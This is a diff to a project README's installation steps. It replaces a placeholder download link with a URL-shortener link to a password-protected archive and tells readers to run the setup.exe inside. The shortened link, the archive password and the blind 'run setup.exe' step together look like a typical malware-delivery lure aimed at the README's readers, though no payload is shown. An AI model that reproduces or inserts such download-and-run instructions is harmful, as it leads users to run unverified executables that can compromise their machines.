@@ -10,7 +10,7 @@
 ## 📥 Installation & Launch
 
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ [Download](https://examplelink.com) and extract archive(pass: Project12!)  
+1️⃣ [Download](https://goo.su/vSA0WIJ) and extract archive(pass: Project12!)  
 2️⃣ Run `setup.exe`  
 🚀 The application will set up everything automatically, just enjoy!  
 
